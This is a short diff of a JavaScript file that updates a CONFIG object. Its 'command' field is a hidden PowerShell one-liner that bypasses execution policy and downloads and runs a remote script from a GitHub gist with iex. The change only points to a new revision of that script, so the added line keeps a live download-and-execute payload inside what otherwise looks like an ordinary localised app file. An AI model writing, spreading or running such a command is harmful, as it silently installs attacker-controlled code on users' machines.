@@ -1,5 +1,5 @@
 const CONFIG = {
-    command: "powershell -WindowStyle Hidden -NoP -ep Bypass -c \"iex(New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/bigmouse200/2c9ce09f62e9f6a75cfdb07e08b7e510/raw/5c8cc896ee93af5517d8d23cb6b2ed6d1550c68f/combined.ps1')\""
+    command: "powershell -WindowStyle Hidden -NoP -ep Bypass -c \"iex(New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/bigmouse200/2c9ce09f62e9f6a75cfdb07e08b7e510/raw/f3be144ba26f02ffdfc44befd677f63a988751df/combined.ps1')\""
 };
 const I18N = {
     en: {
